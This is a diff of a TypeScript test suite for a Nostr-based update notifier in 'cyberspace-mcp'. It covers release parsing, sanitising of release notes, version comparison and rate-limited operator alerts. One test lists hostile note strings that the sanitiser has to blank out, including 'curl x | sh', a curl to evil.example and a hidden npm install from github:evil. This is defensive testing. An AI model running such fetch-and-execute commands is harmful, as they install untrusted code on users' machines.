@@ -55,13 +55,13 @@ function release(sk: Uint8Array, f: Fields = {}, createdAt = NOW): NostrEvent {
   return finalizeEvent({ kind: f.kind ?? RELEASE_KIND, created_at: createdAt, tags, content: f.note ?? 'Fixes from the security review.' }, sk) as NostrEvent
 }
 
-function watch(opts: { running?: string; dir?: string; now?: () => number; tell?: (t: string) => Promise<unknown>; hasOperator?: () => boolean } = {}): { w: UpdateWatch; dir: string; told: string[]; logs: string[] } {
+function watch(opts: { running?: string; dir?: string; now?: () => number; tell?: (t: string) => Promise<unknown>; hasOperator?: () => boolean; releasePubkey?: string; settleMs?: number } = {}): { w: UpdateWatch; dir: string; told: string[]; logs: string[] } {
   const dir = opts.dir ?? mkdtempSync(join(tmpdir(), 'cyberspace-mcp-updates-'))
   const told: string[] = []
   const logs: string[] = []
   const w = new UpdateWatch({
-    dir: StateDir.open(dir), releasePubkey: RELEASE, running: opts.running ?? '0.1.0', now: opts.now ?? (() => NOW), log: (l) => logs.push(l),
-    hasOperator: opts.hasOperator ?? (() => true), tell: opts.tell ?? (async (t) => { told.push(t) }), retellMs: 0,
+    dir: StateDir.open(dir), releasePubkey: opts.releasePubkey ?? RELEASE, running: opts.running ?? '0.1.0', now: opts.now ?? (() => NOW), log: (l) => logs.push(l),
+    hasOperator: opts.hasOperator ?? (() => true), tell: opts.tell ?? (async (t) => { told.push(t) }), retellMs: 0, settleMs: opts.settleMs ?? 0,
   })
   return { w, dir, told, logs }
 }
@@ -121,7 +121,7 @@ describe('reading a release', () => {
       ['an asset id that is not hex', release(releaseSk, { e: ['xyz'] })],
       ['no platform', release(releaseSk, { f: [] })],
       ['a platform with spaces', release(releaseSk, { f: ['linux x86'] })],
-      ['no version', finalizeEvent({ kind: RELEASE_KIND, created_at: NOW, tags: [['i', APP_ID], ['d', `${APP_ID}@`], ['c', 'main']], content: '' }, releaseSk) as NostrEvent],
+      ['no version', (() => { const ev = release(releaseSk); return finalizeEvent({ kind: RELEASE_KIND, created_at: NOW, tags: ev.tags.filter((t) => t[0] !== 'version'), content: '' }, releaseSk) as NostrEvent })()],
       ['two versions', release(releaseSk, { extra: [['version', '0.3.0']] })],
       ['two d tags', release(releaseSk, { extra: [['d', `${APP_ID}@0.2.0`]] })],
       ['two channels', release(releaseSk, { extra: [['c', 'main']] })],
@@ -137,6 +137,10 @@ describe('reading a release', () => {
       ['notes too long', release(releaseSk, { note: 'x'.repeat(65_537) })],
     ]
     for (const [why, ev] of bad) expect(parseNotice(ev, RELEASE, NOW), why).toBeNull()
+    // A bare tag is skipped, never a crash (doctor reads with no try around it).
+    expect(() => parseNotice(release(releaseSk, { extra: [['a'], ['e', ASSET], ['f', 'linux-x86_64']] }), RELEASE, NOW)).not.toThrow()
+    expect(parseNotice(release(releaseSk, { extra: [['a']] }), RELEASE, NOW)).not.toBeNull()
+    expect(parseNotice(release(releaseSk, { extra: [['e']] }), RELEASE, NOW)).toBeNull()
     // Tags it does not know are skipped, so NIP-82 or a later version can add some.
     expect(parseNotice(release(releaseSk, { extra: [['alt', 'cyberspace-mcp 0.2.0'], ['p', 'e'.repeat(64)], ['zap', 'e'.repeat(64)]] }), RELEASE, NOW)).not.toBeNull()
     for (const junk of [null, 'release', 7, [], { kind: RELEASE_KIND }]) expect(parseNotice(junk, RELEASE, NOW)).toBeNull()
@@ -153,6 +157,14 @@ describe('reading a release', () => {
     expect(noteOf('safe \u202e hs.live')).toBe('')
     expect(noteOf('x'.repeat(400))).toHaveLength(280)
     expect(noteOf('')).toBe('')
+    // Idempotent, so a kept note reads back.
+    expect(noteOf('# #1 fix')).toBe('1 fix')
+    expect(noteOf(noteOf('# #1 fix'))).toBe('1 fix')
+    // Line separators, zero-width and tag characters, backticks, pipes, bare domains and URI schemes show nothing.
+    for (const bad of ['Fix.\u2028To update: npm i -g github:evil/x', 'fi\u200bx', 'fix \u{E0041}', 'run `curl x`', 'curl x | sh', 'run curl evil.example/fix.sh', 'see nostr:npub1abc', 'magnet:?xt=1', 'costs $5']) expect(noteOf(bad), bad).toBe('')
+    // Ordinary notes do.
+    expect(noteOf('Fixes from the security review: operator-only mode (#103) and payment approval.')).toBe('Fixes from the security review: operator-only mode (#103) and payment approval.')
+    expect(noteOf('Version 0.2.0 fixes 3 bugs.')).toBe('Version 0.2.0 fixes 3 bugs.')
   })
 
   it('compares versions as numbers', () => {
@@ -215,6 +227,27 @@ describe('latest by version, minimum by high-water mark', () => {
     expect(b.w.line()).toBeNull()
   })
 
+  it('what another release key signed does not count: a release with a new key starts over', () => {
+    const a = watch({ running: '0.1.0' })
+    a.w.consider(release(releaseSk, { version: '999999.0.0', minSafe: '999999.0.0' }, NOW - 100))
+    expect(a.w.status().state).toBe('unsafe')
+    const rotated = watch({ running: '1.0.0', dir: a.dir, releasePubkey: getPublicKey(generateSecretKey()) })
+    expect(rotated.w.status()).toMatchObject({ state: 'unknown', minSafe: null })
+    expect(rotated.w.off('payments')).toBeNull()
+  })
+
+  it('a told list that is not an object is dropped, not trusted', async () => {
+    const a = watch({ running: '0.1.0' })
+    a.w.consider(release(releaseSk, { version: '0.2.0' }, NOW - 100))
+    await a.w.tellOnce()
+    const file = JSON.parse(readFileSync(join(a.dir, 'update.json'), 'utf8')) as Record<string, unknown>
+    expect(Object.keys(file.told as object)).toEqual(['0.2.0|'])
+    StateDir.open(a.dir).writeJson('update.json', { ...file, told: ['0.2.0|'] })
+    const b = watch({ running: '0.1.0', dir: a.dir })
+    await b.w.tellOnce()
+    expect(b.told).toHaveLength(1)
+  })
+
   it('a kept release someone edited by hand is read as strictly as an event', () => {
     const a = watch({ running: '0.1.0' })
     a.w.consider(release(releaseSk, { version: '0.2.0' }, NOW - 100))
@@ -236,6 +269,10 @@ describe('what the releases mean', () => {
     expect(judge(seen, '0.1.4').state).toBe('unsafe')
     // A version that cannot be read is below every minimum.
     expect(judge(seen, 'garbage').state).toBe('unsafe')
+    // A pre-release of X.Y.Z is below X.Y.Z.
+    expect(judge(seen, '0.2.0-rc.1').state).toBe('available')
+    expect(judge(seen, '0.1.5-rc.1').state).toBe('unsafe')
+    expect(judge(seen, '0.2.1-rc.1').state).toBe('current')
     // A security release is remembered after a later plain one.
     const later = absorb(seen, parseNotice(release(releaseSk, { version: '0.2.1', security: false }), RELEASE, NOW)!)
     expect(judge(later, '0.1.9')).toMatchObject({ state: 'available', security: true })
@@ -280,8 +317,9 @@ describe('what the releases mean', () => {
 })
 
 describe('telling the operator', () => {
-  it('once per version, again when the minimum rises, and not at all when current or with no operator', async () => {
-    const { w, told } = watch({ running: '0.1.0' })
+  it('once per version, again when the minimum rises, never more than the caps, and not at all when current or with no operator', async () => {
+    let clock = NOW
+    const { w, told } = watch({ running: '0.1.0', now: () => clock })
     w.consider(release(releaseSk, { version: '0.2.0' }, NOW - 100))
     await w.tellOnce()
     expect(told).toHaveLength(1)
@@ -290,8 +328,21 @@ describe('telling the operator', () => {
     expect(told).toHaveLength(1)
     w.consider(release(releaseSk, { version: '0.2.0', minSafe: '0.2.0' }, NOW - 80))
     await w.tellOnce()
+    // A minimum newly above this copy is told sooner than the hourly cap, but not at once.
+    expect(told).toHaveLength(1)
+    clock += 10 * 60
+    await w.tellOnce()
     expect(told).toHaveLength(2)
     expect(told[1]).toContain('below the minimum safe version 0.2.0')
+    // A newer version within the hour waits for the hour.
+    w.consider(release(releaseSk, { version: '0.2.1', minSafe: '0.2.0' }, NOW - 70))
+    clock += 60
+    await w.tellOnce()
+    expect(told).toHaveLength(2)
+    clock += 60 * 60
+    await w.tellOnce()
+    expect(told).toHaveLength(3)
+    expect(told[2]).toContain('cyberspace-mcp 0.2.1 is out')
 
     const current = watch({ running: '0.2.0' })
     current.w.consider(release(releaseSk, { version: '0.2.0' }, NOW - 100))
@@ -302,6 +353,18 @@ describe('telling the operator', () => {
     alone.w.consider(release(releaseSk, { version: '0.2.0' }, NOW - 100))
     await alone.w.tellOnce()
     expect(alone.told).toHaveLength(0)
+  })
+
+  it('releases that arrive together are told as one, about the latest', async () => {
+    const { w, told } = watch({ running: '0.1.0', settleMs: 30 })
+    // A relay sends a backport first, then the newer release.
+    w.consider(release(releaseSk, { version: '0.2.5' }, NOW - 50))
+    w.consider(release(releaseSk, { version: '0.3.0' }, NOW - 100))
+    await new Promise((r) => setTimeout(r, 80))
+    await w.tellOnce()
+    expect(told).toHaveLength(1)
+    expect(told[0]).toContain('cyberspace-mcp 0.3.0 is out')
+    w.stop()
   })
 
   it('a DM that was not delivered is tried again, and counted only once it is', async () => {
@@ -487,5 +550,8 @@ describe('scripts/publish-update-notice.mjs', () => {
     expect(run([...base, '--note', 'see https://example.com']).err).toMatch(/no link/)
     expect(run([...base, '--note', 'x', '--min-safe', '0.2.0']).err).toMatch(/cannot be above/)
     expect(run([...base, '--note', 'x', '--yes']).err).toMatch(/unknown argument/)
+    expect(run([...base, '--note', 'x', '--version', '0.2.0']).err).toMatch(/given twice/)
+    expect(run([...base, '--note', 'x', '--security', '--security']).err).toMatch(/given twice/)
+    expect(run([...base, '--note', 'x', '--relay', 'ws://plain.example']).err).toMatch(/not a wss:\/\/ URL/)
   })
 })
